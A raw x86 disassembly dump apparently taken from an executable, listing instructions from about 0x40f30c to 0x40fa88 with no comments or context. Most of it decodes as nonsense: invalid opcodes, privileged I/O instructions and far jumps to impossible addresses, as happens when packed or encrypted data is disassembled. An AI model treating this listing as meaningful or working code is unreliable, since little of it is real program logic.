  40f30c:	cmp    BYTE PTR [esi],dh
  40f30e:	mov    WORD PTR [edx],ss
  40f310:	int3   
  40f311:	and    dl,BYTE PTR [ebp-0x512937f0]
  40f317:	cdq    
  40f318:	add    BYTE PTR [edi+0x10d9733],ah
  40f31e:	js     0x40f2fa
  40f320:	mov    BYTE PTR [ebx+0x12],ch
  40f323:	scas   al,BYTE PTR es:[edi]
  40f324:	rcr    DWORD PTR [edx+ecx*1+0x716c1132],cl
  40f32b:	push   ss
  40f32c:	or     DWORD PTR [eax-0x158d5316],ecx
  40f332:	xchg   esi,eax
  40f333:	fwait
  40f334:	or     dl,0x31
  40f337:	pop    ebx
  40f338:	repz or DWORD PTR [eax],0x253d5a4e
  40f33f:	jbe    0x40f311
  40f341:	sbb    esi,DWORD PTR [esi]
  40f343:	xchg   ebp,eax
  40f344:	fdiv   QWORD PTR [ecx+0x29]
  40f347:	jmp    0xce5c7675
  40f34c:	nop
  40f34d:	sub    eax,0x37ba56e
  40f352:	jecxz  0x40f357
  40f354:	xchg   ecx,eax
  40f355:	and    BYTE PTR [eax+0x3e4a384f],dl
  40f35b:	jl     0x40f2e6
  40f35d:	mov    eax,ds:0x4886262
  40f362:	xchg   edx,eax
  40f363:	sub    bl,al
  40f365:	fnstcw WORD PTR [eax]
  40f367:	sti    
  40f368:	cmp    ch,BYTE PTR [ebp-0x49]
  40f36b:	(bad)  
  40f36c:	push   esi
  40f36d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f36e:	push   0xffffffdc
  40f370:	mov    ss,WORD PTR [edi+0x17d78675]
  40f376:	ins    DWORD PTR es:[edi],dx
  40f377:	pop    ds
  40f378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f379:	pop    esi
  40f37a:	fbld   TBYTE PTR [ecx-0x24]
  40f37d:	les    edx,FWORD PTR [esi+0x63e2e19]
  40f383:	(bad)  
  40f385:	add    BYTE PTR [ecx-0x2b],al
  40f388:	jnp    0x40f36e
  40f38a:	rol    DWORD PTR [eax+0x67466b7b],cl
  40f390:	shl    BYTE PTR ds:0xe25eba3e,0xe8
  40f397:	fidivr DWORD PTR fs:[esi+0xf]
  40f39b:	and    edx,ebx
  40f39d:	mov    ebx,0x9de10056
  40f3a2:	nop
  40f3a3:	mov    bl,0xfe
  40f3a5:	lods   eax,DWORD PTR ds:[esi]
  40f3a6:	stos   DWORD PTR es:[edi],eax
  40f3a7:	ins    BYTE PTR es:[edi],dx
  40f3a8:	mov    esp,0x1fbebdc8
  40f3ad:	outs   dx,DWORD PTR ds:[esi]
  40f3ae:	mov    dl,0xa
  40f3b0:	jmp    0x5701be61
  40f3b5:	mov    dh,dh
  40f3b7:	add    eax,0x4066e541
  40f3bc:	or     al,0x6
  40f3be:	lods   al,BYTE PTR ds:[esi]
  40f3bf:	(bad)  
  40f3c0:	aam    0x8e
  40f3c2:	mov    al,bl
  40f3c4:	and    ebx,ebp
  40f3c6:	jl     0x40f3ea
  40f3c8:	pop    ss
  40f3c9:	push   es
  40f3ca:	in     al,dx
  40f3cb:	scas   al,BYTE PTR es:[edi]
  40f3cc:	test   ch,0x71
  40f3cf:	jno    0x40f43f
  40f3d1:	sbb    ah,ch
  40f3d3:	fisttp QWORD PTR [ebx+esi*1+0x11]
  40f3d7:	push   ebx
  40f3d8:	in     eax,0xda
  40f3da:	push   cs
  40f3db:	sar    BYTE PTR [esi+ebx*4],1
  40f3de:	sbb    ch,BYTE PTR [edi]
  40f3e0:	sbb    al,0x81
  40f3e2:	sub    edi,edi
  40f3e4:	ja     0x40f465
  40f3e6:	scas   eax,DWORD PTR es:[edi]
  40f3e7:	push   ds
  40f3e8:	xchg   ecx,eax
  40f3e9:	inc    ecx
  40f3ea:	in     eax,dx
  40f3eb:	leave  
  40f3ec:	xchg   ecx,eax
  40f3ed:	push   cs
  40f3ee:	jae    0x40f391
  40f3f0:	mov    ebx,0x28d0ca93
  40f3f5:	sbb    BYTE PTR [edi+edx*4],dh
  40f3f8:	mov    dh,0xa0
  40f3fa:	and    al,0x9d
  40f3fc:	test   DWORD PTR [edi-0x3a],0x355f31b2
  40f403:	mov    ebx,DWORD PTR [ebx]
  40f405:	inc    ecx
  40f406:	add    al,0x10
  40f408:	fldenv [ebp-0x72dec4f3]
  40f40e:	cmp    ebp,DWORD PTR [ebp-0x35]
  40f411:	aam    0x58
  40f413:	push   esp
  40f414:	push   esi
  40f415:	scas   eax,DWORD PTR es:[edi]
  40f416:	sub    esi,DWORD PTR [ebx+esi*2-0xa]
  40f41a:	push   esi
  40f41b:	hlt    
  40f41c:	ss xchg ebx,eax
  40f41e:	ret    0x27d1
  40f421:	add    esi,DWORD PTR [ebp-0x72c1f85d]
  40f427:	pop    esp
  40f428:	shl    eax,1
  40f42a:	mov    eax,ds:0x33d493a0
  40f42f:	xlat   BYTE PTR ds:[ebx]
  40f430:	xchg   ebx,eax
  40f431:	push   es
  40f432:	das    
  40f433:	lods   al,BYTE PTR ds:[esi]
  40f434:	lds    edx,FWORD PTR [esi-0x32]
  40f437:	pop    ss
  40f438:	std    
  40f439:	ja     0x40f452
  40f43b:	jg     0x40f4bb
  40f43d:	mov    bh,0x77
  40f43f:	cs cmp eax,0x25cfbc23
  40f445:	add    BYTE PTR [edi+eiz*4],bl
  40f448:	into   
  40f449:	cmp    ah,BYTE PTR [esi+ecx*4]
  40f44c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f44d:	stos   DWORD PTR es:[edi],eax
  40f44e:	push   edx
  40f44f:	jns    0x40f4ae
  40f451:	jmp    0x3de8:0xd936f318
  40f458:	adc    eax,esp
  40f45a:	sbb    DWORD PTR [ebx],esi
  40f45c:	xor    DWORD PTR [ebx-0xe],edx
  40f45f:	call   0x97f7:0x952a4cd7
  40f466:	sub    DWORD PTR [esi+0x3a2fa4e0],ebp
  40f46c:	je     0x40f441
  40f46e:	mov    ecx,0x2864bd61
  40f473:	mov    ds:0x8ef6ab49,eax
  40f478:	xchg   ebp,eax
  40f479:	inc    ebp
  40f47a:	inc    edi
  40f47b:	inc    ecx
  40f47c:	pop    ecx
  40f47d:	in     al,dx
  40f47e:	jns    0x40f4ad
  40f480:	aad    0xb5
  40f482:	and    ch,BYTE PTR [ecx]
  40f484:	rol    edi,1
  40f486:	xor    al,0xd5
  40f488:	xor    esi,DWORD PTR [ebx-0x7871ed27]
  40f48e:	pop    eax
  40f48f:	stos   DWORD PTR es:[edi],eax
  40f490:	in     al,dx
  40f491:	fcmove st,st(7)
  40f493:	dec    ebx
  40f494:	mov    edx,DWORD PTR [edx]
  40f496:	mov    esi,DWORD PTR ds:0x421cd2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421cd2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	and    ebp,ebp
  40f4c6:	xchg   edx,eax
  40f4c7:	jmp    0x40f514
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx-0x48]
  40f4d1:	cli    
  40f4d2:	dec    esp
  40f4d3:	fcom   QWORD PTR [ecx+ebx*2]
  40f4d6:	aad    0xd
  40f4d8:	sub    al,0x2c
  40f4da:	dec    ecx
  40f4db:	inc    ebx
  40f4dc:	cld    
  40f4dd:	mov    eax,0xfb821915
  40f4e2:	push   eax
  40f4e3:	not    BYTE PTR [ebp+eax*4+0x65]
  40f4e7:	out    0x6a,eax
  40f4e9:	fsubr  st,st(4)
  40f4eb:	mov    al,0x81
  40f4ed:	(bad)  
  40f4ee:	push   0x5b3cf26a
  40f4f3:	push   esp
  40f4f4:	mul    BYTE PTR ds:0x6029108
  40f4fa:	adc    al,dh
  40f4fc:	cmp    eax,0x12bc2bfe
  40f501:	lahf   
  40f502:	xor    dh,ch
  40f504:	imul   edi,DWORD PTR [esi+0x65],0x240abcce
  40f50b:	loope  0x40f554
  40f50d:	xchg   ebx,eax
  40f50e:	jns    0x40f4e0
  40f510:	and    eax,0x6bb67730
  40f515:	xchg   edi,eax
  40f516:	cmp    eax,0xe14ee33c
  40f51b:	or     dh,0xd6
  40f51e:	jle    0x40f555
  40f520:	(bad)  
  40f521:	int    0x38
  40f523:	inc    eax
  40f524:	sub    eax,0x8a628942
  40f529:	xor    dh,dl
  40f52b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f52c:	inc    ecx
  40f52d:	or     DWORD PTR [edi+0x6b714f77],ecx
  40f533:	jp     0x40f55b
  40f535:	and    al,0x7b
  40f537:	lock jb 0x40f4d5
  40f53a:	xchg   edx,eax
  40f53b:	test   BYTE PTR [edi],dl
  40f53d:	xchg   ebp,eax
  40f53e:	pop    ebx
  40f53f:	into   
  40f540:	mov    bh,0xca
  40f542:	call   0xfdcc:0x617f887b
  40f549:	div    DWORD PTR [edi-0x3d]
  40f54c:	mov    eax,0x422a4ff4
  40f551:	inc    esp
  40f552:	das    
  40f553:	neg    DWORD PTR [edi-0x318dd7b6]
  40f559:	ds sub bl,al
  40f55c:	retf   0x1aa0
  40f55f:	int    0xca
  40f561:	sar    DWORD PTR [eax+0x76],1
  40f564:	xchg   esi,eax
  40f565:	sbb    BYTE PTR [esi],dl
  40f567:	mov    ah,0x3f
  40f569:	xchg   ebp,eax
  40f56a:	stc    
  40f56b:	dec    ebp
  40f56c:	dec    ebp
  40f56d:	xor    DWORD PTR [eax-0x36],0x246bfb07
  40f574:	dec    edx
  40f575:	inc    esi
  40f577:	das    
  40f578:	shl    ch,0xf9
  40f57b:	push   ebp
  40f57c:	pop    esp
  40f57d:	xchg   esi,eax
  40f57e:	dec    ebx
  40f57f:	jle    0x40f567
  40f581:	ret    
  40f582:	or     ebp,eax
  40f584:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f585:	adc    esp,esi
  40f587:	dec    ecx
  40f588:	out    dx,al
  40f589:	mov    ebx,0x162bf03f
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	lahf   
  40f590:	inc    ecx
  40f591:	mov    bh,0x11
  40f593:	mov    ebp,0x339a086f
  40f598:	pop    eax
  40f599:	cmp    esi,eax
  40f59b:	and    eax,0x331531ed
  40f5a0:	std    
  40f5a1:	leave  
  40f5a2:	adc    cl,bl
  40f5a4:	cdq    
  40f5a5:	adc    DWORD PTR [ebp-0x35],0x9cb2b080
  40f5ac:	mov    bh,0x61
  40f5ae:	rcl    BYTE PTR [ecx+0x635cdc8a],1
  40f5b4:	or     ah,BYTE PTR [eax+0x45]
  40f5b7:	inc    ebp
  40f5b8:	pop    ebx
  40f5b9:	jge    0x40f610
  40f5bb:	cmp    BYTE PTR [edi+ebx*4-0x5abac90a],0xc
  40f5c3:	lds    edi,FWORD PTR [eax+ecx*1]
  40f5c6:	out    dx,al
  40f5c7:	cdq    
  40f5c8:	scas   eax,DWORD PTR es:[edi]
  40f5c9:	ret    0x17ba
  40f5cc:	cld    
  40f5cd:	iret   
  40f5ce:	int    0xe5
  40f5d0:	clc    
  40f5d1:	pop    ebp
  40f5d2:	ret    0xec09
  40f5d5:	call   0xd01e8284
  40f5da:	and    BYTE PTR [ebx+0x7db185cb],dl
  40f5e0:	pop    eax
  40f5e1:	push   edi
  40f5e2:	cmp    eax,0x72992bec
  40f5e7:	in     eax,0x9d
  40f5e9:	cmp    DWORD PTR [ebp+0x40497aab],ebx
  40f5ef:	retf   
  40f5f0:	imul   eax,DWORD PTR [edx+0x69],0xab8833b4
  40f5f7:	aad    0x29
  40f5f9:	dec    eax
  40f5fa:	and    ch,BYTE PTR [esi]
  40f5fc:	fimul  WORD PTR [eax+0x59]
  40f5ff:	xor    ah,dh
  40f601:	xchg   edi,eax
  40f602:	sub    DWORD PTR [edx+0x7efa3105],esi
  40f608:	rcr    al,1
  40f60a:	lods   al,BYTE PTR ds:[esi]
  40f60b:	jge    0x40f5ec
  40f60d:	les    esi,FWORD PTR [edx+0x2e]
  40f610:	mov    bl,0x2b
  40f612:	daa    
  40f613:	push   esi
  40f614:	add    BYTE PTR [edx+0x20989a93],ch
  40f61a:	xchg   esp,eax
  40f61b:	ror    DWORD PTR [ebp-0x6e],0x66
  40f61f:	cmp    eax,0x97b4bbda
  40f624:	or     eax,0x4d538a9e
  40f629:	xchg   BYTE PTR [edi+0x75d16163],al
  40f62f:	ret    0x814e
  40f632:	loop   0x40f5f8
  40f634:	pop    esp
  40f635:	daa    
  40f636:	outs   dx,BYTE PTR ds:[esi]
  40f637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f638:	(bad)  
  40f639:	pop    ebx
  40f63a:	pop    eax
  40f63b:	addr16 es mov dl,0xe9
  40f63f:	out    0x9e,eax
  40f641:	add    eax,0x7d105e93
  40f646:	in     al,0x6a
  40f648:	mov    ds:0xa76aea51,al
  40f64d:	jns    0x40f650
  40f64f:	scas   eax,DWORD PTR es:[edi]
  40f650:	push   ss
  40f651:	pop    edi
  40f652:	and    DWORD PTR [ebp+0xa7954d6],esp
  40f658:	pop    ds
  40f659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f65a:	pop    esi
  40f65b:	or     eax,0xa5230d17
  40f660:	loopne 0x40f67f
  40f662:	inc    esp
  40f663:	popa   
  40f664:	cwde   
  40f665:	mov    BYTE PTR [ecx-0x5083b0f9],dl
  40f66b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f66c:	mov    DWORD PTR [ebp+0x10],ecx
  40f66f:	mov    esi,0xdf5c0d54
  40f674:	retf   
  40f675:	aam    0xc6
  40f677:	jg     0x40f64c
  40f679:	sbb    ecx,DWORD PTR ds:0xc7a9098
  40f67f:	std    
  40f680:	fwait
  40f681:	jbe    0x40f6a9
  40f683:	push   0x4cd0db87
  40f688:	pop    esp
  40f689:	int    0x50
  40f68b:	popa   
  40f68c:	lock jge 0x40f6c1
  40f68f:	fcomp  QWORD PTR [eax+ebx*4]
  40f692:	out    0x1,al
  40f694:	inc    eax
  40f695:	stc    
  40f696:	gs fsubp st(0),st
  40f699:	push   eax
  40f69a:	retf   0x58c8
  40f69d:	lock mov al,0xea
  40f6a0:	fabs   
  40f6a2:	jmp    0xb50feb33
  40f6a7:	inc    edx
  40f6a8:	fwait
  40f6a9:	clc    
  40f6aa:	and    cl,al
  40f6ac:	push   edx
  40f6ad:	xchg   edx,eax
  40f6af:	int3   
  40f6b0:	ja     0x40f6eb
  40f6b2:	pop    ecx
  40f6b3:	test   eax,0x8f969f37
  40f6b8:	push   edx
  40f6b9:	(bad)  
  40f6ba:	dec    ecx
  40f6bb:	dec    ebp
  40f6bc:	cli    
  40f6bd:	jbe    0x40f67b
  40f6bf:	and    al,0xd8
  40f6c1:	jle    0x40f6ad
  40f6c3:	inc    ebx
  40f6c4:	push   0x7f30f024
  40f6c9:	cmc    
  40f6ca:	or     ecx,DWORD PTR [edi]
  40f6cc:	and    DWORD PTR [edi+ebx*4+0xb],0x8d234039
  40f6d4:	add    BYTE PTR [edi],ah
  40f6d6:	push   edi
  40f6d7:	mov    ss,WORD PTR ds:[edx-0x449f4571]
  40f6de:	stos   BYTE PTR es:[edi],al
  40f6df:	sbb    ch,dh
  40f6e1:	inc    edi
  40f6e2:	ficom  WORD PTR [ebp-0x2d7add30]
  40f6e8:	inc    esp
  40f6e9:	sbb    DWORD PTR [esi+0xb5ea89b],edx
  40f6ef:	mov    ebx,0x480b47d1
  40f6f4:	stos   DWORD PTR es:[edi],eax
  40f6f5:	sbb    eax,0x5251d89d
  40f6fa:	ror    BYTE PTR [esi],cl
  40f6fc:	(bad)  
  40f6fd:	repz test DWORD PTR ds:0x3798c166,0x1d0cbab1
  40f708:	mov    ds:0xad259144,eax
  40f70d:	jle    0x40f6b8
  40f70f:	sahf   
  40f710:	rcr    DWORD PTR [eax+0x364a090f],0xe6
  40f717:	sub    BYTE PTR [esi+0x33],bh
  40f71a:	mov    dl,0xf4
  40f71c:	and    eax,0xfaf77ecb
  40f721:	add    ah,BYTE PTR [edx+0x49afaaf2]
  40f727:	or     al,0xdb
  40f729:	lds    edi,FWORD PTR [edi+edi*2]
  40f72c:	jnp    0x40f702
  40f72e:	jl     0x40f737
  40f730:	call   0x72a0370d
  40f735:	jmp    0x802a:0xc4190165
  40f73c:	cld    
  40f73d:	imul   esi,DWORD PTR [esi+0xac32d01],0xffffff90
  40f744:	ins    DWORD PTR es:[edi],dx
  40f745:	and    al,0x2b
  40f747:	pop    es
  40f748:	cmp    dh,cl
  40f74a:	fcomp  QWORD PTR [ebx]
  40f74c:	xor    BYTE PTR [ebp+ecx*1-0x7d352c92],bl
  40f753:	loop   0x40f6de
  40f755:	cs scas eax,DWORD PTR es:[edi]
  40f757:	jo     0x40f721
  40f759:	pusha  
  40f75a:	lock and eax,0x792fc03a
  40f760:	aaa    
  40f761:	fcmovne st,st(3)
  40f763:	in     eax,dx
  40f764:	out    dx,eax
  40f765:	push   eax
  40f766:	xchg   ecx,eax
  40f767:	sub    eax,0x2b2e3bb4
  40f76c:	ja     0x40f71e
  40f76e:	inc    esp
  40f76f:	in     al,0x51
  40f771:	test   al,0x17
  40f773:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f774:	jp     0x40f775
  40f776:	dec    eax
  40f777:	and    esp,DWORD PTR [ebp+edi*8-0x13]
  40f77b:	adc    BYTE PTR [bp+si+0x54f8],bl
  40f780:	push   ebx
  40f781:	mov    esp,0xd6e1a8b4
  40f786:	aaa    
  40f787:	out    0xaa,eax
  40f789:	pop    ecx
  40f78a:	add    al,0xf6
  40f78c:	or     DWORD PTR [edi-0x718e664b],ebx
  40f792:	mov    cl,0x0
  40f794:	inc    edi
  40f795:	push   edi
  40f796:	inc    edx
  40f797:	test   eax,0x3325d2a4
  40f79c:	adc    eax,0x806d22e0
  40f7a1:	xor    eax,0x202088f4
  40f7a6:	call   0xf0e3:0x1bef8a64
  40f7ad:	sahf   
  40f7ae:	addr16 cmc 
  40f7b0:	test   al,0xd
  40f7b2:	stos   BYTE PTR es:[edi],al
  40f7b3:	loope  0x40f7b9
  40f7b5:	add    al,0x94
  40f7b7:	pop    edx
  40f7b8:	je     0x40f7db
  40f7ba:	loop   0x40f7f1
  40f7bc:	popf   
  40f7bd:	iret   
  40f7be:	sbb    eax,0x3957471f
  40f7c3:	adc    eax,0xb2b2e43
  40f7c8:	cmp    DWORD PTR [esi+0x7b101740],edi
  40f7ce:	pop    edi
  40f7cf:	xchg   ecx,eax
  40f7d0:	or     edx,esp
  40f7d2:	cmp    al,0xcd
  40f7d4:	out    dx,al
  40f7d5:	repnz mul ebp
  40f7d8:	add    BYTE PTR [esi],0x5f
  40f7db:	sbb    al,0x4e
  40f7dd:	cli    
  40f7de:	mov    edi,0x61d39b94
  40f7e3:	fs add al,0x7f
  40f7e6:	inc    bp
  40f7e8:	into   
  40f7e9:	pop    ds
  40f7ea:	gs pushf 
  40f7ec:	xchg   ch,dl
  40f7ee:	sbb    eax,0xaaa20370
  40f7f3:	retf   
  40f7f4:	xor    al,0x44
  40f7f6:	sub    esi,DWORD PTR [ebp-0x4c]
  40f7f9:	(bad)  
  40f7fa:	cmp    eax,DWORD PTR [edx-0x40029d97]
  40f800:	test   BYTE PTR [edi+ecx*4-0x60],ch
  40f804:	repz rdmsr 
  40f807:	repnz or DWORD PTR [esi-0x59c44896],ebx
  40f80e:	daa    
  40f80f:	pusha  
  40f810:	jne    0x40f79f
  40f812:	mov    esp,0x6871c540
  40f817:	scas   eax,DWORD PTR es:[edi]
  40f818:	jg     0x40f848
  40f81a:	ds jle 0x40f891
  40f81d:	inc    eax
  40f81e:	and    esp,DWORD PTR [edi+0x476c319]
  40f824:	call   0xca1d9dc6
  40f829:	fs jg  0x40f878
  40f82c:	xchg   ebp,eax
  40f82d:	lea    esi,[ecx]
  40f82f:	jecxz  0x40f81e
  40f831:	or     eax,0x80a5b2f3
  40f836:	mov    bl,0x0
  40f838:	mov    bl,0x69
  40f83b:	xor    ch,BYTE PTR ds:0x376eb74
  40f841:	in     al,0x38
  40f843:	stos   BYTE PTR es:[edi],al
  40f844:	mov    ds:0xdef6c494,eax
  40f849:	ins    DWORD PTR es:[edi],dx
  40f84a:	sub    BYTE PTR [edx],cl
  40f84c:	aaa    
  40f84d:	pop    ecx
  40f84e:	repz in eax,0xba
  40f851:	out    dx,al
  40f852:	push   cs
  40f853:	in     eax,dx
  40f854:	mov    cs,WORD PTR [eax]
  40f856:	cli    
  40f857:	adc    eax,0xcdc5195c
  40f85c:	inc    edi
  40f85d:	and    al,BYTE PTR [eax+edx*2-0x6ffea426]
  40f864:	fistp  WORD PTR [ecx]
  40f866:	out    0xfc,eax
  40f868:	add    eax,0x671a0ba5
  40f86d:	ja     0x40f858
  40f86f:	call   0x6fb2:0x558ccc4c
  40f876:	jae    0x40f896
  40f878:	(bad)  
  40f87a:	imul   esp,DWORD PTR [ebp-0x73bff635],0x8db74693
  40f884:	fdiv   st,st(1)
  40f886:	xor    eax,0x8f6c1f43
  40f88b:	inc    eax
  40f88c:	dec    ebx
  40f88d:	mov    dh,0xc9
  40f88f:	and    cl,BYTE PTR [esi]
  40f891:	jl     0x40f903
  40f893:	ins    DWORD PTR es:[edi],dx
  40f894:	mov    esp,DWORD PTR [ebx-0x4]
  40f897:	lahf   
  40f898:	and    ebx,ebx
  40f89a:	icebp  
  40f89b:	call   0x38d46cbe
  40f8a0:	push   0x18
  40f8a2:	sbb    ebp,DWORD PTR [ecx]
  40f8a4:	hlt    
  40f8a5:	push   ebx
  40f8a6:	sbb    cl,cl
  40f8a8:	pop    ebp
  40f8a9:	in     eax,dx
  40f8aa:	jle    0x40f8a4
  40f8ac:	pop    esp
  40f8ad:	add    DWORD PTR [ebx],ebp
  40f8af:	inc    edi
  40f8b0:	ret    0x8fe9
  40f8b3:	mov    dh,0xaa
  40f8b5:	adc    BYTE PTR ds:0xe43d5e44,dl
  40f8bb:	cmc    
  40f8bc:	out    0xe5,al
  40f8be:	les    edx,FWORD PTR [ecx+0x459c7473]
  40f8c4:	test   al,0xc9
  40f8c6:	mov    bh,0xc4
  40f8c8:	stc    
  40f8c9:	rcr    bl,0x70
  40f8cc:	and    eax,0x21a45630
  40f8d1:	xor    al,BYTE PTR [eax+0x357ad678]
  40f8d7:	sbb    BYTE PTR [eax-0x21],bl
  40f8da:	ja     0x40f889
  40f8dc:	(bad)  
  40f8dd:	in     al,0xdf
  40f8df:	inc    ecx
  40f8e0:	ss push ebx
  40f8e2:	fstp   TBYTE PTR [esi+0x36]
  40f8e5:	mov    al,ds:0x7ee14c6b
  40f8ea:	outs   dx,DWORD PTR ds:[esi]
  40f8eb:	mov    dl,0xbd
  40f8ed:	xor    eax,0x17198b97
  40f8f2:	shr    DWORD PTR [eax+0x7b],cl
  40f8f5:	sbb    BYTE PTR [edi-0xd],bl
  40f8f8:	sbb    bl,BYTE PTR [ebp+0x68e0a600]
  40f8fe:	test   DWORD PTR [ebx+0x6370b553],ebp
  40f904:	pop    edx
  40f905:	mov    bh,0x9f
  40f907:	shl    DWORD PTR es:[esi-0x7e543a36],1
  40f90e:	stos   BYTE PTR es:[edi],al
  40f90f:	inc    esp
  40f910:	jae    0x40f973
  40f912:	push   edi
  40f913:	and    eax,DWORD PTR [ebx]
  40f915:	call   0x6956:0x1ba40a19
  40f91c:	push   ebp
  40f91d:	mov    WORD PTR [ebp+0x18],?
  40f920:	cmp    DWORD PTR [ecx-0x43],eax
  40f923:	push   edi
  40f924:	scas   al,BYTE PTR es:[edi]
  40f925:	cmp    edx,DWORD PTR [esi-0x36]
  40f928:	dec    edx
  40f929:	or     ebx,DWORD PTR [ebx-0x627294c3]
  40f92f:	nop
  40f930:	mov    DWORD PTR [ecx],eax
  40f932:	sub    cl,BYTE PTR [edi+0x1a]
  40f935:	push   edx
  40f936:	dec    eax
  40f937:	scas   eax,DWORD PTR es:[edi]
  40f938:	jle    0x40f907
  40f93a:	stc    
  40f93b:	iret   
  40f93c:	cmp    al,BYTE PTR [edi-0x55]
  40f93f:	add    DWORD PTR [ecx+eax*2],esp
  40f942:	xchg   edi,eax
  40f943:	add    eax,0xe3a52406
  40f948:	sub    al,0x42
  40f94a:	leave  
  40f94b:	pop    eax
  40f94c:	cmp    eax,0xd1db449c
  40f951:	add    eax,0x78449870
  40f956:	push   0xfffffff4
  40f958:	xor    BYTE PTR [ecx+ecx*1],ch
  40f95b:	cmp    esi,DWORD PTR [edi+0x3e0aee54]
  40f961:	jbe    0x40f992
  40f963:	test   DWORD PTR [esi+0x41],esi
  40f966:	sub    eax,0xbf8227d9
  40f96b:	jb     0x40f9ba
  40f96d:	jg     0x40f9b8
  40f96f:	nop
  40f970:	jmp    0xf7f6:0x1db9d6fc
  40f977:	mov    ds:0x3c04c2c5,eax
  40f97c:	inc    ecx
  40f97d:	scas   al,BYTE PTR es:[edi]
  40f97e:	xchg   BYTE PTR [ecx],al
  40f980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f981:	(bad)  
  40f982:	(bad)  
  40f983:	mov    WORD PTR [ebp-0x56],?
  40f986:	aam    0xd5
  40f988:	stos   DWORD PTR es:[edi],eax
  40f989:	in     al,dx
  40f98a:	cli    
  40f98b:	mov    esi,0x531a285e
  40f990:	(bad)  
  40f991:	mov    esi,0xc72e29c6
  40f996:	pop    edi
  40f997:	(bad)  
  40f998:	inc    ebp
  40f999:	jmp    0xae75dda5
  40f99e:	mov    esp,0xbf6e4eb5
  40f9a3:	popf   
  40f9a4:	mov    WORD PTR [ebp-0x20],ss
  40f9a7:	test   BYTE PTR [eax+0x5c],ch
  40f9aa:	xchg   DWORD PTR [edx+0x463e6a4d],edx
  40f9b0:	jno    0x40f99b
  40f9b2:	hlt    
  40f9b3:	push   0xbc3e1c38
  40f9b8:	push   eax
  40f9b9:	xchg   ecx,eax
  40f9ba:	mov    ds:0xeb342acb,al
  40f9bf:	xchg   dl,bh
  40f9c1:	fdiv   DWORD PTR [ebp*1+0x7e3f0592]
  40f9c8:	stos   BYTE PTR es:[edi],al
  40f9c9:	xor    ch,bl
  40f9cb:	sub    BYTE PTR [ebp-0x5c297a1c],al
  40f9d1:	outs   dx,DWORD PTR ds:[esi]
  40f9d2:	call   0x1bb5:0x8ba03253
  40f9d9:	aam    0x4d
  40f9db:	fs icebp 
  40f9dd:	xlat   BYTE PTR ds:[ebx]
  40f9de:	jo     0x40fa28
  40f9e0:	into   
  40f9e1:	xor    dl,bh
  40f9e3:	xchg   ebx,eax
  40f9e4:	sub    eax,DWORD PTR [ebx-0x3]
  40f9e7:	mov    ah,0xc0
  40f9e9:	pop    eax
  40f9ea:	sbb    eax,0xa00bc545
  40f9ef:	cmc    
  40f9f0:	cmp    bl,BYTE PTR [esi+0x3da06d97]
  40f9f6:	rol    DWORD PTR [edi+eax*1-0x5f],0xcc
  40f9fb:	xchg   DWORD PTR [esi+edi*4],esi
  40f9fe:	xchg   edx,eax
  40f9ff:	xor    BYTE PTR [esi],al
  40fa01:	bnd je 0x40f9c8
  40fa04:	int3   
  40fa05:	aaa    
  40fa06:	sbb    esp,esi
  40fa08:	or     esi,DWORD PTR [edx]
  40fa0a:	addr16 icebp 
  40fa0c:	xor    DWORD PTR [ebp-0x44],0xffffff85
  40fa10:	inc    edx
  40fa11:	mov    eax,ds:0x65d5f81
  40fa16:	mov    edi,0x7e6feaae
  40fa1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa1c:	mov    edx,DWORD PTR [eax+0x5c]
  40fa1f:	xchg   esi,eax
  40fa20:	mov    esi,0xb60077e7
  40fa25:	mov    cl,0x35
  40fa27:	sahf   
  40fa28:	or     eax,0xeac74b63
  40fa2d:	imul   ebx,esp,0x54f9008a
  40fa33:	(bad)  
  40fa34:	cmp    eax,0x318dac4f
  40fa39:	xor    eax,0x2b382e56
  40fa3e:	push   edi
  40fa3f:	ins    DWORD PTR es:[edi],dx
  40fa40:	pop    esp
  40fa41:	pop    ebx
  40fa42:	dec    eax
  40fa43:	or     eax,DWORD PTR [edi]
  40fa45:	div    DWORD PTR [esi+0x6e]
  40fa48:	pop    esp
  40fa49:	pushf  
  40fa4a:	xor    esi,ebx
  40fa4c:	pop    esi
  40fa4d:	call   0x7b9dfa1f
  40fa52:	jb     0x40fa18
  40fa54:	push   edx
  40fa55:	add    BYTE PTR [ecx],0x3c
  40fa58:	jns    0x40fa7d
  40fa5a:	in     eax,dx
  40fa5b:	enter  0xf77d,0x1d
  40fa5f:	ficomp DWORD PTR [edi+eax*2+0x23d01ba1]
  40fa66:	mov    edx,0xeba5e825
  40fa6b:	popa   
  40fa6c:	enter  0xff00,0x7b
  40fa70:	out    0x1b,al
  40fa72:	xor    dl,BYTE PTR [edx]
  40fa74:	les    esp,FWORD PTR [ecx+0x17]
  40fa77:	data16 jge 0x40fa1e
  40fa7a:	mov    al,0x3b
  40fa7c:	pop    edi
  40fa7d:	fisubr DWORD PTR [ebp+eiz*4+0x72]
  40fa81:	stos   BYTE PTR es:[edi],al
  40fa82:	rcr    DWORD PTR [eax+0x5f],1
  40fa85:	icebp  
  40fa86:	ins    BYTE PTR es:[edi],dx
  40fa87:	lods   al,BYTE PTR ds:[esi]
  40fa88:	lahf   
